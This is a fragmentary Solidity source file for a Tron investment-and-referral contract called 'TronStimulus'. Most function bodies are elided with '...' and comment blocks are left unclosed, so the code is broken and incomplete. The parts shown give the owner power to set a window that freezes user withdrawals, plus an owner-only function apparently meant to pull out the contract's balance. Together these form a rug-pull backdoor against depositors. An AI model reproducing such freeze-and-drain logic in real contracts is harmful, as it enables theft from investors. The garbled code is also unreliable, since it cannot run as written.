//SourceUnit: final.sol

pragma solidity 0.5.10;

contract TronStimulus {
    using SafeMath for uint;
    uint withdrawalfreezebegin;
    uint withdrawalfreezeend;
    uint constant public DEPOSITS_MAX = 100;
    uint constant public INVEST_MIN_AMOUNT = 300 ;
    uint constant public BASE_PERCENT = 300;
    uint[] public REFERRAL_PERCENTS = [500, 300, 100, 50, 50];
    uint constant public MARKETING_FEE = 500;
    uint constant public FUND_FEE = 500;
/*    uint constant public MAX_CONTRACT_PERCENT = 500;
    uint constant public MAX_HOLD_PERCENT = 500;     */
    uint constant public MAX_DEPOSIT_PERCENT = 500;
    uint constant public PERCENTS_DIVIDER = 10000;
    uint constant public CONTRACT_BALANCE_STEP = 250000 ;
    uint constant public USER_DEPOSITS_STEP = 5000 ;
    ...
    constructor(address payable marketingAddr, address payable fundAddr,address payable owners) public {
    ...
    function set(uint x, uint y)  public onlyOwner{
     withdrawalfreezebegin = x;
     withdrawalfreezeend = y;
     }   

     function get() public  view returns(uint begin,uint end) {
        return (withdrawalfreezebegin,withdrawalfreezeend);
      }

    function WithdrawalContractbalance ()   public onlyOwner{
...
/*        if (contractPercent < BASE_PERCENT.add(MAX_CONTRACT_PERCENT)) {
    ...
    function withdraw() public {
       if(block.timestamp >= withdrawalfreezebegin && block.timestamp <= withdrawalfreezeend){
    ...
    function getContractBalanceRate() internal view returns (uint) {
        uint contractBalance = address(this).balance;
        uint contractBalancePercent = BASE_PERCENT;
